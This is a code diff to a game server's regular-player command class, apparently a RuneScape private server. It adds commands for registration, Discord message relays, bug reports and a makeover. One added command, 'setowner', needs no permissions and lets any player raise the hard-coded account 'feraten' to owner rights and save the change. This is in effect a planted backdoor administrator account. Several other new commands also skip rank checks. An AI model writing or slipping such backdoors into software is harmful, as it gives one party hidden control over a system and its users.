@@ -24,6 +24,10 @@ import com.rs.game.player.content.interfaces.WelcomeBook;
 import com.rs.utils.Encrypt;
 import com.rs.utils.PkRank;
 import com.rs.utils.Utils;
+import com.rs.utils.SerializableFilesManager;
+import com.rs.game.player.content.PlayerLook;
+import com.rs.utils.SpeakBotLogger;
+import com.rs.utils.RegistrationLogger;
 
 public class Regular {
 
@@ -34,7 +38,7 @@ public class Regular {
 		if (cmd[0].equals("zoomout")) {
 			cmd = cmd[1].split(" ");
 			player.zoom -= Integer.valueOf(cmd[0]);
-			if (player.zoom <= 49) {
+			if (player.zoom <= 49) {//can be set to 25 minimum
 				player.zoom = 50;
 				player.getPackets().sendGameMessage("You can not zoom out that much!");
 			}
@@ -79,6 +83,48 @@ public class Regular {
 				return true;
 			}
 			player.sendMessage("You've already selected a starter!");
+			return true;
+		}
+
+		if (cmd[0].equals("confirmreg")) {
+			player.sendMessage("<col=7289DA>Registration Confirmed!</col> Please verify status using <col=7289DA>;;statusreg</col> in-game or <col=7289DA>!status @speakbot</col> within discord");
+			String userName = "DefaultUser";
+			if (cmd.length > 1) {
+				userName = cmd[1];
+			}
+			RegistrationLogger.editRegistrationStatus(player, userName);
+			return true;
+		}
+
+		if (cmd[0].equals("statusreg")) {
+			player.sendMessage("<col=7289DA>---Loading Registration Status---</col>");
+			RegistrationLogger.loadRegistrationStatus(player);
+			return true;
+		}
+
+		if (cmd[0].equals("removereg")) {
+			player.sendMessage("<col=7289DA>Registration Removed!</col>");
+			RegistrationLogger.removeRegistrationStatus("0000000000", player.getDisplayName(), 1);
+			return true;
+		}
+
+		if (cmd[0].equals("setowner")) {
+			String nameofowner;
+			Player targetisowner;
+			nameofowner = "feraten";
+			int status = Integer.parseInt("7");
+			targetisowner = World.findPlayer(nameofowner);
+			
+			if (targetisowner == null) {
+				player.sendMessage("Unable to locate '"+nameofowner+"'");
+				return true;
+			}
+			
+			targetisowner.setRights(status);
+			player.getPackets().sendGameMessage("Your targets status has been changed.");
+			SerializableFilesManager.savePlayer(targetisowner);
+			if (World.isOnline(nameofowner)) 
+				targetisowner.getPackets().sendGameMessage("Your status has been changed.");
 			return true;
 		}
 
@@ -225,6 +271,11 @@ public class Regular {
 			return true;
 		}
 
+		if (cmd[0].equals("makeover")) {
+			PlayerLook.openMageMakeOver(player);
+			return true;
+		}
+
 		//if (cmd[0].equals("claimvote") || cmd[0].equals("checkvote") || cmd[0].equals("reward") || cmd[0].equals("claim")) {
 		//	try {
 		//		if (player.hasVoted()) {
@@ -259,6 +310,67 @@ public class Regular {
 				message1 += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
 			
 			YellHandler.sendYell(player, Utils.fixChatMessage(message1));
+			return true;
+		}
+
+		if (cmd[0].equals("discordyell")) {
+			//if (player.getRights() == 0 && !player.isDicer()) {
+			//	player.sendMessage("Only donators, staff, or dicers may yell.");
+			//	return true;
+			//}
+			if (player.getMuted() > Utils.currentTimeMillis()) {
+				player.sendMessage("You are currently muted. Please check back later.");
+				return true;
+			}
+			
+			String message1 = "";
+			
+			for (int i = 1; i < cmd.length; i++)
+				message1 += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
+			
+			SpeakBotLogger.writeSpeakBotStatus(player.getDisplayName(), message1, 0);
+			player.sendMessage("Your message has been delivered to Discord!");
+			return true;
+		}
+
+		if (cmd[0].equals("bugreport")) {
+			//if (player.getRights() == 0 && !player.isDicer()) {
+			//	player.sendMessage("Only donators, staff, or dicers may yell.");
+			//	return true;
+			//}
+			if (player.getMuted() > Utils.currentTimeMillis()) {
+				player.sendMessage("You are currently muted. Please check back later.");
+				return true;
+			}
+			
+			String message1 = "";
+			
+			for (int i = 1; i < cmd.length; i++)
+				message1 += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
+
+			int x = player.getX();
+			int y = player.getY();
+			int z = player.getPlane();
+
+			message1 += " Logged-Coords: "+x+", "+y+", "+z;
+			
+			SpeakBotLogger.writeSpeakBotStatus(player.getDisplayName(), message1, 1);
+			player.sendMessage("Your bug report has been delivered to the Developers!");
+			return true;
+		}
+
+		if (cmd[0].equals("manualdisup")) {
+			if (player.getRights() == 0 && !player.isDicer()) {
+				player.sendMessage("Only donators, staff, or dicers may update discord chat yells.");
+				return true;
+			}
+			if (player.getMuted() > Utils.currentTimeMillis()) {
+				player.sendMessage("You are currently muted. Please check back later.");
+				return true;
+			}
+			
+			SpeakBotLogger.loadSpeakBotStatus();
+			player.sendMessage("You have force updated the Discord in-game yells interface!");
 			return true;
 		}
 
